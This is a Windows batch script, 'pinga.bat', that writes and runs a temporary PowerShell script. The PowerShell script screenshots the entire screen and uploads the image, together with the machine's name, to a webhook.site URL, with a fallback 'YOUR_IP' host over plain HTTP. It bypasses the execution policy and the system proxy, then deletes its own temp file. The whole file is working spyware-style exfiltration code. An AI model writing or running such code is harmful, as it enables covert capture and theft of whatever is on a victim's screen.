@echo off
setlocal
:: pinga.bat - screenshot + notify. No curl. Falls back to HOOK2 over plain HTTP.

set "HOOK=https://webhook.site/153d95a8-b102-4033-97e3-3eb9e132e87f"
set "HOOK2=http://YOUR_IP/hook"
set "PS=%TEMP%\pg_%RANDOM%%RANDOM%.ps1"

> "%PS%" echo $ErrorActionPreference = 'Stop'
>> "%PS%" echo [Net.ServicePointManager]::SecurityProtocol = 3072
>> "%PS%" echo Add-Type -AssemblyName System.Windows.Forms, System.Drawing
>> "%PS%" echo $r = [System.Windows.Forms.SystemInformation]::VirtualScreen
>> "%PS%" echo $bmp = New-Object System.Drawing.Bitmap $r.Width, $r.Height
>> "%PS%" echo $g = [System.Drawing.Graphics]::FromImage($bmp)
>> "%PS%" echo $g.CopyFromScreen($r.Left, $r.Top, 0, 0, $bmp.Size)
>> "%PS%" echo $ms = New-Object System.IO.MemoryStream
>> "%PS%" echo $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
>> "%PS%" echo $g.Dispose()
>> "%PS%" echo $bmp.Dispose()
>> "%PS%" echo $bytes = $ms.ToArray()
>> "%PS%" echo $ms.Dispose()
>> "%PS%" echo $bd = '----b' + [Guid]::NewGuid().ToString('N')
>> "%PS%" echo $enc = [Text.Encoding]::UTF8
>> "%PS%" echo $pre = "--$bd`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n" + '{"content":"Pinger ran on ' + $env:COMPUTERNAME + '"}' + "`r`n--$bd`r`nContent-Disposition: form-data; name=`"file`"; filename=`"screen.png`"`r`nContent-Type: image/png`r`n`r`n"
>> "%PS%" echo $head = $enc.GetBytes($pre)
>> "%PS%" echo $tail = $enc.GetBytes("`r`n--$bd--`r`n")
>> "%PS%" echo $body = New-Object System.IO.MemoryStream
>> "%PS%" echo $body.Write($head, 0, $head.Length)
>> "%PS%" echo $body.Write($bytes, 0, $bytes.Length)
>> "%PS%" echo $body.Write($tail, 0, $tail.Length)
>> "%PS%" echo foreach ($h in @($env:HOOK, $env:HOOK2)) {
>> "%PS%" echo   if (-not $h) { continue }
>> "%PS%" echo   try {
>> "%PS%" echo     $body.Position = 0
>> "%PS%" echo     $req = [Net.HttpWebRequest]::Create($h)
>> "%PS%" echo     $req.Method = 'POST'
>> "%PS%" echo     $req.ContentType = "multipart/form-data; boundary=$bd"
>> "%PS%" echo     $req.ContentLength = $body.Length
>> "%PS%" echo     $req.Timeout = 20000
>> "%PS%" echo     $req.KeepAlive = $false
>> "%PS%" echo     $req.Proxy = $null
>> "%PS%" echo     $s = $req.GetRequestStream()
>> "%PS%" echo     $body.WriteTo($s)
>> "%PS%" echo     $s.Close()
>> "%PS%" echo     $resp = $req.GetResponse()
>> "%PS%" echo     $resp.Close()
>> "%PS%" echo     Write-Host "sent to $h"
>> "%PS%" echo     break
>> "%PS%" echo   } catch { Write-Host "fail $h : $($_.Exception.Message)" }
>> "%PS%" echo }
>> "%PS%" echo $body.Dispose()

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS%"
del "%PS%" >nul 2>&1
exit